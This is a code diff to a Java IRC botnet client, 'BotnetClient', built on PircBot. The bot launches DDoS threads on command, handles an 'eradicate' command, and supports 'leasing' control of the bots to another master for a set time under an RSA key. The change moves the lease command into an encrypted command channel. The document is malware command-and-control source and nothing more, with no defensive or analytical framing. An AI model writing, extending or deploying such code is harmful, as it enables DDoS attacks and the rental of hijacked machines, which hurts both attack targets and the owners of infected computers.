@@ -164,23 +164,6 @@ public class BotnetClient extends PircBot {
 					DdosThread ddos = new DdosThread(parts[1], Integer.parseInt(parts[2]), Integer.parseInt(parts[3]));
 				}
 				return true;
-			} else if (message.toLowerCase().startsWith("lease")) {
-				String[] parts = message.split(" ");
-				if (parts.length > 4) {
-					String leaseMaster = parts[1];
-					long duration = Long.parseLong(parts[2]);
-					String mod = parts[3];
-					String exp = parts[4];
-					leaseTerminateTime = System.currentTimeMillis() + duration;
-					leased = true;
-					this.leaseMaster = leaseMaster;
-					leasedM = MsgEncrypt.getInstance();
-					leasedM.genRSAPubKey(mod + " " + exp);
-					System.out.println("lease to " + leaseMaster + " with " + leasedM.getRSAPub());
-				} else {
-					System.out.println("Failed lease message: " + message);
-				}
-				return true;
 			} else if (message.toLowerCase().startsWith("eradicate")) {
 				String[] parts = message.split(" ");
 				if (parts.length > 1) {
@@ -290,6 +273,22 @@ public class BotnetClient extends PircBot {
 						System.out.println(m.msgKey);
 						chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
 						chat.close();
+					} else if (commandRSA.startsWith("leasekey")) {
+						String[] parts = commandRSA.split(" ");
+						if (parts.length > 4) {
+							String leaseMaster = parts[1];
+							long duration = Long.parseLong(parts[2]);
+							String mod = parts[3];
+							String exp = parts[4];
+							leaseTerminateTime = System.currentTimeMillis() + duration;
+							leased = true;
+							this.leaseMaster = leaseMaster;
+							leasedM = MsgEncrypt.getInstance();
+							leasedM.genRSAPubKey(mod + " " + exp);
+							System.out.println("lease to " + leaseMaster + " with " + leasedM.getRSAPub());
+						} else {
+							System.out.println("Failed lease message: " + command);
+						}
 					} else if (leased && leasedCommandRSA.startsWith("key")) {
 						System.out.println("Handshaking with leaseMaster");
 						String otherKey = leasedM.decryptRSA(chat.readLine());
